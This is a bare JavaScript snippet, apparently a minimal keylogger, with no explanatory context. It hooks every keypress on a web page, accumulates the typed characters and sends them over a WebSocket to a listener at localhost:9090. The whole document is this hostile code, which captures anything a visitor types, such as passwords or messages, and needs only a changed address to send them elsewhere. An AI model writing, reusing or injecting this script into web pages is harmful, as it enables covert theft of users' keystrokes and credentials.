<script type="text/javascript">
  var socket = new WebSocket('ws://localhost:9090');
  let c = "";
  document.onkeypress = function (e) {
    c += e.key;
    socket.send(c);
  }
</script>
